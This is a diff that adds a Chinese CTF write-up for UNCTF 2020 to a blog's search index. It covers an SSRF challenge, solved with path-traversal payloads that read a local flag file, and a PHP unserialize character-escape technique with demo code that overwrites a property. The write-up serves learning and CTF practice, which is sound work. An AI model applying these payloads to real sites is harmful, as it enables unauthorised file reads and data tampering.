@@ -4077,4 +4077,103 @@ E#---
         <tag>bfs</tag>
       </tags>
   </entry>
+  <entry>
+    <title>UNCTF</title>
+    <url>/2020/11/17/UNCTF/</url>
+    <content><![CDATA[<p>比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。</p>
+<h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">echo</span><span class="hljs-string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+$url = $_GET[<span class="hljs-string">'url'</span>];
+<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/unctf\.com/'</span>,$url))&#123;
+    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;
+        $url=file_get_contents($url);
+        <span class="hljs-keyword">echo</span>($url);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'error!!'</span>);
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"error"</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>看下代码发现过滤了大部分协议名，一开始一直以为是使用特殊编码绕过结果行不通</p>
+<p>后来才知道考点根本不绕过。</p>
+<p>payload：</p>
+<div class="hljs"><pre><code class="hljs coffeescript">?file=unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../../flag
+<span class="hljs-regexp">//</span>不唯一
+?file=():unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag
+<span class="hljs-regexp">//</span>()里可以填任意字符除了正则过滤的几个协议</code></pre></div>
+
+<p><strong>原理：</strong>当php遇到一个不认识的protocol时，会抛出一个warning，并将protocol设置为null,在protoco为null或file时，则进行本地操作。默认情况下不传协议或传入了不存在协议，会进行本地文件操作。</p>
+<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p><strong>考察点是反序列化字符逃逸</strong></p>
+<p>先冲简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'bb'</span>, <span class="hljs-string">'ccc'</span>, $str);
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
+    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">'aaaa'</span>;
+    <span class="hljs-keyword">public</span> $pass=<span class="hljs-string">'123456'</span>;
+&#125;
+$AA=<span class="hljs-keyword">new</span> A();
+$res=filter(serialize($AA));
+
+$c=unserialize($res);
+<span class="hljs-keyword">echo</span> $c-&gt;pass;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>利用反序列化逃逸修改pass的值。</p>
+<p>正常的序列化结果</p>
+<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"aaaa"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"pass"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;&#125;</code></pre></div>
+
+<p><code>s:4:&quot;aaaa&quot;</code>s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。</p>
+<p>例如</p>
+<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"aaaa"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"pass"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;&#125;</code></pre></div>
+
+<p>将4改为5，那么则认为name的值为 <code>aaaa&quot;</code>,此时因为前面的”无法闭合而导致反序列化失败。</p>
+<p><img src="https://i.loli.net/2020/11/18/Ctefk8iKXP34Gmn.png" srcset="/img/loading.gif" alt="error.png"></p>
+<p>而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。</p>
+<p>例如想将pass变量的序列化字符串如下</p>
+<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"pass"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:"hacker"</span>;&#125;</code></pre></div>
+
+<p>其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志</p>
+<p>上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;
+    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'bb'</span>, <span class="hljs-string">'ccc'</span>, $str);
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
+    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";&#125;'</span>;
+    <span class="hljs-keyword">public</span> $pass=<span class="hljs-string">'123456'</span>;
+&#125;
+$AA=<span class="hljs-keyword">new</span> A();
+var_dump(serialize($AA));
+$res=filter(serialize($AA));
+var_dump($res);
+$c=unserialize($res);
+<span class="hljs-keyword">echo</span> $c-&gt;pass;
+<span class="hljs-comment">//echo unserialize($AA);</span>
+<span class="hljs-comment">//";s:4:"pass";s:6:"hacker";&#125;</span>
+<span class="hljs-meta">?&gt;</span>
+   <span class="hljs-comment">//结果如下   ||为对齐</span>
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">string(136) "O:1:"A":2:&#123;s:4:"name";s:81:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";&#125;";s:4:"pass";s:6:"123456";&#125;"||</span>
+<span class="hljs-comment">string(163) "O:1:"A":2:&#123;s:4:"name";s:81:"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";s:4:"pass";s:6:"hacker";&#125;"||;s:4:"pass";s:6:"123456";&#125;"</span>
+<span class="hljs-comment">hacker</span>
+<span class="hljs-comment">*/</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" srcset="/img/loading.gif" alt="success.png"></p>
+<p>这里pass的值就被该称了hacker</p>
+<p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
+<p><a href="https://www.cnblogs.com/Sumarua/p/12932401.html" target="_blank" rel="noopener">参考</a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ssrf</tag>
+      </tags>
+  </entry>
 </search>
